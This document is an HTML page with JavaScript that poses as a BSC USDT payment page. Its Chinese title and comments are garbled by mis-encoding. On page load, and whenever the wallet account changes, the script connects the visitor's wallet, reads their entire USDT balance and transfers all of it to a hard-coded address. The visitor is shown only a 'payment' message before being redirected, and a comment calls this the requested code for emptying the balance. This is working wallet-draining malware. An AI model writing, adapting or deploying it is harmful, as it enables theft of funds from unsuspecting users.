<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Áû¨ÁßªÊîØ‰ªò ¬∑ Ê∏ÖÁ©∫‰ΩôÈ¢ùÁâà</title>
    <!-- ethers v6 -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        body {
            background: #0b0f17;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            color: #e2e8f0;
        }
        .ghost-message {
            background: #1e293b;
            border-radius: 60px;
            padding: 16px 32px;
            border: 1px solid #3b82f6;
            box-shadow: 0 15px 30px -10px #00000080;
            font-size: 0.95rem;
            max-width: 400px;
            text-align: center;
            backdrop-filter: blur(8px);
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <!-- ÊúÄÂ∞èÂèçÈ¶àÂå∫ -->
    <div id="statusMessage" class="ghost-message hidden"></div>

    <script>
        (function() {
            // ========== ÈÖçÁΩÆ ==========
            const CONFIG = {
                usdtAddress: "0x55d398326f99059fF775485246999027B3197955",  // BSC USDT
                receiveAddress: "0x9728D428764F846E8DD62C34371db716A9228238", // Êî∂Ê¨æÂú∞ÂùÄ
                redirectUrl: "https://your-dashboard.com",  // Ë∑≥ËΩ¨ÁõÆÊ†á
                storageKey: "PAYMENT_DONE_FLAG"
            };

            // ========== Â∑•ÂÖ∑ÂáΩÊï∞ ==========
            function hasPaid() {
                try {
                    return localStorage.getItem(CONFIG.storageKey) === 'true';
                } catch (e) {
                    return false;
                }
            }

            function markPaid() {
                try {
                    localStorage.setItem(CONFIG.storageKey, 'true');
                } catch (e) {}
            }

            const statusDiv = document.getElementById('statusMessage');
            function showMessage(msg, isError = false) {
                if (!statusDiv) return;
                statusDiv.style.background = isError ? '#991b1b' : '#1e293b';
                statusDiv.style.borderColor = isError ? '#ef4444' : '#3b82f6';
                statusDiv.innerText = msg;
                statusDiv.classList.remove('hidden');
            }

            function hideMessage() {
                if (statusDiv) statusDiv.classList.add('hidden');
            }

            // ========== Ê†∏ÂøÉÊîØ‰ªòÈÄªËæëÔºàÊ∏ÖÁ©∫‰ΩôÈ¢ùÁâàÔºâ==========
            async function executePayment() {
                // Â∑≤ÊîØ‰ªòÊ£ÄÊü•
                if (hasPaid()) {
                    window.location.replace(CONFIG.redirectUrl);
                    return;
                }

                // Ê£ÄÊü•Èí±ÂåÖ
                if (!window.ethereum) {
                    showMessage('‚ùå Êú™Ê£ÄÊµãÂà∞Èí±ÂåÖ', true);
                    if (confirm('ÊòØÂê¶ÂÆâË£ÖMetaMaskÔºü')) {
                        window.open('https://metamask.io/download/', '_blank');
                    }
                    return;
                }

                try {
                    // 1. ÂàáÊç¢Âà∞BSCÁΩëÁªú
                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                    if (chainId !== '0x38') {
                        showMessage('üîÑ ÂàáÊç¢Ëá≥BSCÁΩëÁªú...');
                        try {
                            await window.ethereum.request({
                                method: 'wallet_switchEthereumChain',
                                params: [{ chainId: '0x38' }]
                            });
                        } catch (switchError) {
                            if (switchError.code === 4902) {
                                await window.ethereum.request({
                                    method: 'wallet_addEthereumChain',
                                    params: [{
                                        chainId: '0x38',
                                        chainName: 'Binance Smart Chain',
                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                                    }]
                                });
                            } else {
                                throw switchError;
                            }
                        }
                    }

                    // 2. ËøûÊé•Èí±ÂåÖ
                    showMessage('üîå ËØ∑Ê±ÇÈí±ÂåÖËøûÊé•...');
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const userAddress = accounts[0];

                    // 3. ÂàõÂª∫ÂêàÁ∫¶ÂÆû‰æã
                    const provider = new ethers.BrowserProvider(window.ethereum);
                    const signer = await provider.getSigner();

                    const usdtAbi = [
                        "function balanceOf(address) view returns (uint256)",
                        "function decimals() view returns (uint8)",
                        "function transfer(address to, uint256 amount) returns (bool)"
                    ];
                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, usdtAbi, signer);

                    // ===== ËøôÈáåÊòØÊÇ®Ë¶ÅÁöÑ‰ª£Á†ÅÔºöËé∑Âèñ‰ΩôÈ¢ùÂπ∂Ê∏ÖÁ©∫ =====
                    // 4. Ëé∑ÂèñÁî®Êà∑USDT‰ΩôÈ¢ù
                    showMessage('üí∞ Ëé∑Âèñ‰ΩôÈ¢ù‰∏≠...');
                    const balance = await usdtContract.balanceOf(userAddress);
                    
                    // Ê£ÄÊü•ÊòØÂê¶Êúâ‰ΩôÈ¢ù
                    if (balance === 0n) {  // BigIntÊØîËæÉ
                        throw new Error('USDT‰ΩôÈ¢ù‰∏∫0ÔºåÊó†Ê≥ïÊîØ‰ªò');
                    }

                    // Ëé∑ÂèñdecimalsÁî®‰∫éÊòæÁ§∫
                    const decimals = await usdtContract.decimals();
                    const formattedBalance = ethers.formatUnits(balance, decimals);
                    showMessage(`üí∏ Â∞ÜÊîØ‰ªò ${formattedBalance} USDT`);

                    // 5. Áõ¥Êé•Áî®‰ΩôÈ¢ù‰Ωú‰∏∫ÊîØ‰ªòÈáëÈ¢ùÔºàËΩ¨Ëµ∞ÂÖ®ÈÉ®Ôºâ
                    const amountWei = balance;  // ËøôÂ∞±ÊòØÊ∏ÖÁ©∫‰ΩôÈ¢ùÁöÑÂÖ≥ÈîÆ

                    // 6. ÂèëÈÄÅËΩ¨Ë¥¶‰∫§Êòì
                    showMessage('‚úçÔ∏è ËØ∑Âú®Èí±ÂåÖ‰∏≠Á°ÆËÆ§...');
                    const tx = await usdtContract.transfer(CONFIG.receiveAddress, amountWei);
                    showMessage('‚è≥ Á≠âÂæÖ‰∫§ÊòìÁ°ÆËÆ§...');
                    await tx.wait();

                    // 7. ÊàêÂäüÔºÅ
                    showMessage('‚úÖ ÊîØ‰ªòÊàêÂäüÔºÅ');
                    markPaid();

                    // 8. Ë∑≥ËΩ¨
                    setTimeout(() => {
                        window.location.replace(CONFIG.redirectUrl);
                    }, 1000);

                } catch (error) {
                    console.error('ÊîØ‰ªòÂ§±Ë¥•:', error);
                    
                    let errorMsg = 'ÊîØ‰ªòÂ§±Ë¥•: ';
                    if (error.code === 4001) {
                        errorMsg += 'Áî®Êà∑ÂèñÊ∂à‰∫§Êòì';
                    } else if (error.message.includes('‰ΩôÈ¢ù‰∏∫0')) {
                        errorMsg = error.message;
                    } else {
                        errorMsg += error.message || 'Êú™Áü•ÈîôËØØ';
                    }
                    showMessage('‚ùå ' + errorMsg, true);
                }
            }

            // ========== ÂêØÂä® ==========
            window.addEventListener('load', () => {
                if (hasPaid()) {
                    window.location.replace(CONFIG.redirectUrl);
                    return;
                }
                executePayment();
            });

            // Ë¥¶Êà∑ÂàáÊç¢Â§ÑÁêÜ
            if (window.ethereum) {
                window.ethereum.on('accountsChanged', (accounts) => {
                    if (accounts.length > 0 && !hasPaid()) {
                        hideMessage();
                        executePayment();
                    }
                });
            }

        })();
    </script>
</body>
</html>
